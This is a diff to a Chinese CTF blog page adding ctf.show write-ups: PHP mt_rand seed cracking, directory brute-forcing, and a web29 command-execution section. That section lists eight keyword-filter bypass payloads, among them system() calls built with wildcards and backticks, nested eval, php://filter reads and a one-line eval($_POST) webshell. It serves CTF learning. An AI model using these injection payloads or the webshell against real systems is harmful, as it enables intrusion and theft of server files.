@@ -19,6 +19,12 @@
 <li><a href="#web21">web21</a></li>
 <li><a href="#web22">web22</a></li>
 <li><a href="#web23">web23</a></li>
+<li><a href="#web25">web25</a></li>
+<li><a href="#web28">web28</a></li>
+</ul>
+</li>
+<li><a href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">命令执行</a><ul>
+<li><a href="#web29">web29</a></li>
 </ul>
 </li>
 </ul>
@@ -98,8 +104,78 @@
 <p>第二种方式，纯数字</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://61535773-6957-4813-b084-0451f6607922.challenge.ctf.show/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100000</span>):</span><br><span class="line">    k = <span class="built_in">str</span>(j).encode(<span class="string">&#x27;utf-8&#x27;</span>)    <span class="comment"># python3中必须进行utf-8编码</span></span><br><span class="line">    token = hashlib.md5(k).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> token[<span class="number">1</span>] == token[<span class="number">14</span>] <span class="keyword">and</span> token[<span class="number">14</span>] == token[<span class="number">17</span>]:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            left = <span class="built_in">int</span>(<span class="built_in">int</span>(token[<span class="number">1</span>])+<span class="built_in">int</span>(token[<span class="number">14</span>])+<span class="built_in">int</span>(token[<span class="number">17</span>])/<span class="built_in">int</span>(token[<span class="number">1</span>]))</span><br><span class="line">            right = <span class="built_in">int</span>(token[<span class="number">31</span>])</span><br><span class="line">            <span class="keyword">if</span> left == right:</span><br><span class="line">                <span class="built_in">print</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(requests.get(url+<span class="string">f&#x27;/?token=<span class="subst">&#123;j&#125;</span>&#x27;</span>).text)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
 
+<h4><span id="web25">web25</span></h4><ul>
+<li><p>和上一题一样，都是利用php随机数的爆破攻击，但是本题没有给种子，因此需要需要使用工具 <a target="_blank" rel="noopener" href="https://www.openwall.com/php_mt_seed/">php_mt_seed</a> 。专门用来跑mt_srand()种子和 mt_rand()随机数。</p>
+<p><img src="/2023/04/19/ctfshow/disda/Desktop/Disda/hexo/source/_posts/ctfshow/509478bc7d684369b08ac08f664cf67b.png" alt="img"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">种子涉及到flag，不能直接求到</span><br><span class="line"><span class="keyword">if</span>((!<span class="variable">$rand</span>)) 要使这个为真，就要让 <span class="variable">$rand</span>=<span class="number">0</span> ，</span><br><span class="line">而 <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>()) </span><br><span class="line">所以要得到随机数才能构造 <span class="variable">$r</span>=<span class="variable">$mt_rand</span>() 。</span><br></pre></td></tr></table></figure>
 
+<p>先传参<code>/?r=0</code>获取生成随机数的负值。</p>
+<p>再进行<code>./php_mt_seed 随机数</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1267174464</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$token</span>=<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
+<p>把r&#x3D;1267174464和token放到cookie中传入，即可获取flag。</p>
+</li>
+</ul>
+<h4><span id="web28">web28</span></h4><ul>
+<li><p>一开始三个位置一起爆破，没成功，看网上wp</p>
+<p>如果修改最后的2.txt会被无限重定向，不删除2.txt只修改前面的0和1依旧会被无限重定向。</p>
+</li>
+<li><p>因此删掉最后2.txt，用集束炸弹模式爆破前两个数字即可。</p>
+</li>
+</ul>
+<h3><span id="命令执行">命令执行</span></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">isset</span>() <span class="comment">#是PHP中一个常用的函数，用于检查变量是否已经被设置并且非 NULL。如果给定的变量存在且其值不为 NULL，则返回 true，否则返回 false</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>() <span class="comment">#是PHP中用于执行正则表达式匹配的函数，它可以在给定的字符串中查找模式匹配，如果匹配成功，返回 1，否则返回 0。该函数需要传入两个参数：正则表达式模式和要搜索的字符串。还可以传递第三个参数，将匹配结果存储到其中。</span></span><br><span class="line"><span class="keyword">eval</span>() <span class="comment">#函数用于将字符串作为PHP代码执行。在执行时，该函数将传递的字符串作为 PHP 代码来执行。</span></span><br></pre></td></tr></table></figure>
+
+<p>因为我们传入的参数能被当作php代码执行，则我们使用一些系统指令：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>tac可以直接看到，cat需要在f12源码里面看</li>
+</ul>
+<h4><span id="web29">web29</span></h4><ul>
+<li><p>知识点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>) <span class="comment"># i的意思是ignore无视大小写</span></span><br></pre></td></tr></table></figure>
+
+<p>本题考察绕过flag.php的方法</p>
+<ul>
+<li><p>方法一：拼接</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># url编码后使用%5c添加到flag中</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fl%<span class="number">5</span>cag%<span class="number">2</span>Ephp%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># url编码后使用$9添加到flag中</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fl$<span class="number">9</span>ag%<span class="number">2</span>Ephp%<span class="number">27</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>方法二：使用通配符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用* cat fla*</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fla*%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># 使用? cat fla?.php</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cat%<span class="number">20</span>fla%<span class="number">3</span>F%<span class="number">2</span>Ephp%<span class="number">27</span>);</span><br><span class="line"><span class="comment"># ?可以出现任意次</span></span><br><span class="line">/?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>tac%<span class="number">20</span>fla?.???%<span class="number">27</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>方法三：使用反引号</p>
+<ul>
+<li>反引号的作用就是将反引号内的Linux命令先执行，然后将执行结果赋予变量。</li>
+<li>由 <code>&#39;&#39;</code> 符号并不会影响命令的执行，所以我们可以插入这些符号来绕过。在linux中可以使用 ’ 来绕过，比如 fl’’ag 就等效于 flag。</li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?c=<span class="built_in">echo</span><span class="variable">%20`tac%</span><span class="number">20</span>fl<span class="variable">%27%</span><span class="number">27</span>ag.php`;</span><br><span class="line"># nl 命令：Linux中nl命令和cat命令很像，不过nl命令会打上行号</span><br><span class="line">/?c=<span class="built_in">echo</span> `nl fl?g.php`;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>方法四：复制大法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cp fla* 1.txt,然后访问目录下的1.txt即可</span></span><br><span class="line">?c=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>cp%<span class="number">20</span>fla*%<span class="number">201</span>.txt%<span class="number">27</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>方法五：利用参数输入+eval</p>
+<ul>
+<li>由于系统只会检测$c中的内容，则我们通过eval()函数构造参数1巧妙绕过</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ?c=eval($_GET[1]);&amp;1=system(&#x27;tac flag.php&#x27;);</span></span><br><span class="line">/?=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(%<span class="number">27</span>tac%<span class="number">20</span>flag.php%<span class="number">27</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>方法六：利用参数输入+include&#x2F;require</p>
+<ul>
+<li>使用include将1包含进来，1再使用php伪协议使用PHP内部设置的过滤器，将flag.php文件读取并以base64编码的格式返回</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>];&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">?c=<span class="keyword">require</span> <span class="variable">$_GET</span>[<span class="number">1</span>];&amp;<span class="number">1</span>=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>方法七：一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>方法八：</p>
+<blockquote>
+<p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。<br>pos() 函数返回数组中当前元素（指针指向）的值。<br>scandir() 函数返回指定目录中的文件和数组。<br>array_reverse() 将数组倒序输出。<br>next() 将指针指向数组的下一个元素并输出。<br>show_source() 对文件进行语法高亮显示，是highlight_file()别名。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">next</span>(<span class="title function_ invoke__">array_reverse</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">localeconv</span>())))));</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
 <h1><span id="愚人节杯">愚人节杯</span></h1><h2><span id="web">WEB</span></h2><h3><span id="easy_signin">easy_signin</span></h3><p>查看浏览器发现url链接是base64加密。<img src="https://img-blog.csdnimg.cn/img_convert/eea66e162a70efe45a115593662b2631.png" alt="image-20230404183149808"></p>
 <p>base64解码是<code>face.png</code>，尝试<code>flag.txt</code>和<code>flag.php</code>，base64加密后传入都不对，用<code>index.php</code>加密后传入，看源码，然后通过base64解密。</p>
 <p><img src="/2023/04/19/ctfshow/disda/Desktop/Disda/hexo/source/_posts/ctfshow/image-20230419181149917.png" alt="image-20230419181149917"></p>
